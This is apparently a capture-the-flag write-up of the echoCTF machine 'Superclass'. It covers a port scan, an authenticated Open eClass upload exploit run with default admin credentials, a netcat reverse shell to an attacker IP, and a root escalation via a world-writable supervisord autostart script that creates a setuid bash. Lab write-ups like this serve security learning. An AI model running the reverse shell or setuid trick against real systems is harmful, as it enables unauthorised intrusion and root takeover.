---
description: >-
  Superclass echoCTF Machine
title: Superclass (Advanced)                # Add title here
date: 2025-02-18 08:00:00 -0600                           # Change the date to match completion date
categories: [echoCTF, Advanced]                     # Change Templates to Writeup
tags: []     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Superclass.png                # Add infocard image here for post preview image
---
##### Host entries
```bash
10.0.160.234    superclass.echocity-f.com
```

### Content

-  Unrestricted File Upload on Open eClass leading to RCE 
-  autostart Program as Root on supervisor.conf

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.234
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.234 ()   Status: Up
Host: 10.0.160.234 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```
Services and Versions running:
```bash
nmap -p22,80 -sCV -n -Pn -vvvv -oN targeted 10.0.160.234
Nmap scan report for 10.0.160.234
Host is up, received user-set (0.16s latency).
Scanned at 2025-02-18 22:53:51 EST for 42s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:cc:6e:b4:e2:3f:be:1c:c5:a8:d7:8e:46:6f:38:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBH0mn1MeXpgoCJ2FPCAmnDseQnQhAABcrPSjOSt2PpI9KMkLWuRepnEbVN7pOFjc971PrlmIhRpvy0M+rzU5Jo=
|   256 31:7c:c2:b9:43:58:3f:c3:3f:c0:e7:b7:48:82:02:32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHXZdXBvqbqcdpuHNpTkXf9LfhQvllpuR8NqZfp8aBe7
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.61 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Open eClass
|_http-favicon: Unknown favicon MD5: D5B69ECF92A558D63AE2EC5FAEDDE360
|_http-server-header: Apache/2.4.61 (Debian)
| http-methods: 
|_  Supported Methods: GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Exploitation
There is only HTTP port open which has a web page only:
![](/assets/img/Pasted-image-20250218215751.png)

However, every resource redirects to `http://superclass.echocity-f.com/` which means we need to add it to our `/etc/hosts` file:

![](/assets/img/Pasted-image-20250218215934.png)

```bash
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


10.0.160.234    superclass.echocity-f.com

```
Looking for exploits on this CMS, we identified the following [exploit for Open eClass RCE](https://github.com/RoboGR00t/Exploit-CVE-2024-26503/blob/main/exploit-cve-2024-26503.py)

Now, the important thing here is that the exploit requires authentication, so we tried with the most common pair of credentials, and voila, the following credentials did work `admin:admin123`.

Now to run our exploit all we need is to use the following parameters:
```bash
python3 exploit.py -u admin -p admin123 -e http://superclass.echocity-f.com

  ___  _  _  ____     ____   __  ____   ___      ____   ___   ___   __  ____                                                                                                                                 
 / __)/ )( \(  __)___(___ \ /  \(___ \ / _ \ ___(___ \ / __) / __) /  \( __ \                                                                                                                                
( (__ \ \/ / ) _)(___)/ __/(  0 )/ __/(__  ((___)/ __/(  _ \(___ \(  0 )(__ (                                                                                                                                
 \___) \__/ (____)   (____) \__/(____)  (__/    (____) \___/(____/ \__/(____/

 ============================ Author: RoboGR00t ============================                                                                                                                                                                                       
[eClass]~# whoami
www-data

```
Finally we start a reverse shell and that's it, we are inside:

```bash
[eClass]~# nc -e /bin/bash 10.10.5.122 1234
```

### Privilege Escalation
Now for the privilege escalation I ran linpeas.sh to check interesting entrypoints, first of all there is an interesting process running:
```bash
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes             
root           1  0.0  0.0   2472   872 pts/0    Ss   04:08   0:00 tini -- /entrypoint.sh supervisord -c /etc/supervisord.conf          
root           7  0.0  0.0   3924  2992 pts/0    S+   04:08   0:00 /bin/bash /entrypoint.sh supervisord -c /etc/supervisord.conf
root          20  0.1  0.3  36956 31156 pts/0    S+   04:08   0:00  _ /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisord.conf
root          21  0.0  0.1  19032 14492 pts/0    S    04:08   0:00      _ /usr/bin/python3 /usr/bin/pidproxy /var/run/apache2/apache2.pid /usr/sbin/apache2ctl -DFOREGROUND

```
Anyway, this is normal on all the echoCTF machines, however is not normal that there is a python3 execution, scrolling down on the linpeas result, there is an interesting finding about this `supervisor.conf` file:
```bash
╔══════════╣ Analyzing Supervisord Files (limit 70)
-rw-r--r-- 1 root root 1178 Dec 27  2022 /etc/supervisor/supervisord.conf                                                               
-rw-rw-r-- 1 root root 1217 Aug 23 08:45 /etc/supervisord.conf

```
It is interesting that the file is readable by any user, so let's dig deeper on this file:
```bash
www-data@superclass:/tmp$ cat /etc/supervisord.conf
[supervisord]
nodaemon=true
pidfile=/run/supervisord.pid
logfile=/var/log/supervisord.log
user=root
logfile_maxbytes=0

[unix_http_server]
file=/run/supervisord.sock       ; (the path to the socket file)
chmod=0777                       ; sockef file mode (default 0700)

[supervisorctl]
serverurl=unix:///run/supervisord.sock

[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

[program:mariadb]
user = root
command=/usr/bin/pidproxy /run/mysqld/mysqld.pid /usr/bin/mysqld_safe --pid-file=/run/mysqld/mysqld.pid
stdout_logfile = /dev/stdout
stdout_logfile_maxbytes = 0
stderr_logfile = /dev/stderr
stderr_logfile_maxbytes = 0

[program:apache2]
user = root
command=/usr/bin/pidproxy /var/run/apache2/apache2.pid /usr/sbin/apache2ctl -DFOREGROUND
stdout_logfile = /dev/stdout
stdout_logfile_maxbytes = 0
stderr_logfile = /dev/stderr
stderr_logfile_maxbytes = 0

[program:sshd]
user = root
command = /usr/sbin/sshd -o PermitRootLogin=yes -D
stdout_logfile=/dev/fd/1
stdout_logfile_maxbytes=0
redirect_stderr=true

[program:autostart]
user = root
autostart = false
command = /tmp/autostart
stdout_logfile=/dev/fd/1
stdout_logfile_maxbytes=0
redirect_stderr=true
```
To be honest, I used ChatGPT to understand a possible privesc, and the `program:autostart` can be abused if a script called `autostart` can be created in `/tmp` with the following content:

```bash
echo '#!/bin/bash' > /tmp/autostart
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/autostart
chmod +x /tmp/autostart
```

If an administrator enables it manually (supervisorctl start autostart), it runs as root.
Since /tmp is world-writable, any user can replace the script.

If an admin runs the following command, it executes the supervisord and the `program:autostart` will execute our malicious script: 
```bash
supervisorctl start autostart
```

Then all we need to do is execute `/bin/bash -p` to get a shell as root.

### Post Exploitation
Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`

### Credentials

```bash
admin:admin123
```

### Notes

-  Sometimes the privesc are on usual files that we often see, the trick here is leaving no stone unturned and check everything even if it seems that is not the way to exploit the machine `supervisord.conf`, `/etc/shadow`, `/root/.ssh/id_rsa` and all the files that usually are unreadable by normal users, should be checked, those are hidden on plainsight and are a low hanging fruit.

### References

- I checked the other writeup for this machine and there is a very useful resource that should be readed: [Using Supervisor](https://medium.com/naukri-engineering/using-supervisor-to-manage-processes-in-linux-98ae4894e9c7)
- [Open eClass RCE Exploit Tool](https://github.com/RoboGR00t/Exploit-CVE-2024-26503)

